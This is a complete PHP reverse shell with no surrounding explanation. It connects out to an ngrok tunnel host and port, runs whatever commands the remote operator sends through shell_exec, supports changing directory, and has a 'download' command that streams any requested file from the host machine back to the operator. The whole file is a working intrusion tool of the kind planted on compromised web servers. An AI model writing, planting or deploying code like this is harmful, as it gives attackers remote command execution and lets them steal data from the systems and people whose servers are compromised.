<?php
$host = "4.tcp.ngrok.io";
// $port = 12927;
$port = 14031;
$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP) or die("could not create socket\n");
$result = socket_connect($socket,$host,$port) or die("could not connect to server\n");
if($result){
    echo "connected to socket server\n";
}
$terminate = "terminate";
$closed = false;
while(true){
    $output = "";
    if($closed){
        die("socket closed successfully\n");
    }
    $input = socket_read($socket,13421000) or die("could not read server response\n");
    if(strlen($input) > 0){
        if(strpos($terminate,$input) !== false){
            socket_close($socket);
            $closed = true;
        }else{
            if(preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $input)) {
                preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $input, $match);
                chdir($match[1]);
                $output = "directory changed to ".getcwd();
                socket_write($socket,$output,13421000);
            }else if (preg_match("/^\s*download\s+(.+)\s*(2>&1)?$/", $input)) {
                preg_match("/^\s*download\s+(.+)\s*(2>&1)?$/", $input,$match);
                $filename = $match[1];
                $fh = fopen($filename,"rb");
                $fileData = fread($fh,1024);
                while($fileData){
                    socket_write($socket,$fileData,1024) ;            
                    $fileData = fread($fh,1024);
                }
                fclose($fh);
                $completed = "completed";
                socket_write($socket,$completed,strlen($completed)) ;            
            }else{
                $output = shell_exec($input);
                if(empty($output)){
                    socket_write($socket,"executed",13421000);                    
                }else{
                    socket_write($socket,$output,13421000);
                }
            }
            // // exec($input,$output);
            // $output = system($input)
            
        }
    }
}
?>